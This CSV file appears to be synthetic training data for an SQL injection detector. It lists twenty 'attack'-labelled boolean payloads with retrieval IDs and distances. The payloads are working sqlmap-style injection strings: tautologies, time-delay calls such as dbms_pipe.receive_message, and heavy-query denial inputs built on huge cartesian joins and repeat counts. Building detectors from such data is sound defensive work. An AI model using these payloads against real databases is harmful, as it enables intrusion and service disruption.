id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000181,attack,boolean,"-2916""   )    )    or 4946  =  8232--",nearest_attack_euclidean,R000126,0.023041140861987778
SMOTE_000182,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",nearest_attack_euclidean,R000139,1.5676916017889295
SMOTE_000183,attack,boolean,"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",nearest_attack_euclidean,R000202,0.5677821650364699
SMOTE_000184,attack,boolean,"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000119,0.5754796495802763
SMOTE_000185,attack,boolean,"-5417 or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000083,0.625822910258352
SMOTE_000186,attack,boolean,"1%"" and 2805  =  1345",nearest_attack_euclidean,R000222,0.513607678386423
SMOTE_000187,attack,boolean," end and    (    (   ""rqay"" like ""rqay",nearest_attack_euclidean,R000045,0.37306555059757057
SMOTE_000188,attack,boolean,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",nearest_attack_euclidean,R000057,0.3455028484190151
SMOTE_000189,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",nearest_attack_euclidean,R000221,1.0758488982700352
SMOTE_000190,attack,boolean,-4494 or 5291  =  4452,nearest_attack_euclidean,R000129,0.41802861054394475
SMOTE_000191,attack,boolean,"-7559"" or 8792  =  6905--",nearest_attack_euclidean,R000099,0.07553740671407115
SMOTE_000192,attack,boolean,"-9553""  )   as geih where 6453  =  6453 or 8453  =  8159--",nearest_attack_euclidean,R000066,0.0177558402106971
SMOTE_000193,attack,boolean,-2820'   )    )    or 6679  =  8848--,nearest_attack_euclidean,R000187,0.3603916637851426
SMOTE_000194,attack,boolean,"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # zcyc",nearest_attack_euclidean,R000046,1.9536869623785202
SMOTE_000195,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R000244,1.5824720205088738
SMOTE_000196,attack,boolean,"1"" and   (  3020  =  3020  )  *6703 and ""itpt""  =  ""itpt",nearest_attack_euclidean,R000151,0.3809278065666972
SMOTE_000197,attack,boolean,-3243 or 2266  =  3583#,nearest_attack_euclidean,R000213,0.07456359414479373
SMOTE_000198,attack,boolean,1' and 1541  =  6868#,nearest_attack_euclidean,R000053,0.22297613777414094
SMOTE_000199,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and ""ihbe"" like ""ihbe",nearest_attack_euclidean,R000249,0.275267666402185
SMOTE_000200,attack,boolean,"1' in boolean mode  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  #",nearest_attack_euclidean,R000225,0.9686122732410938
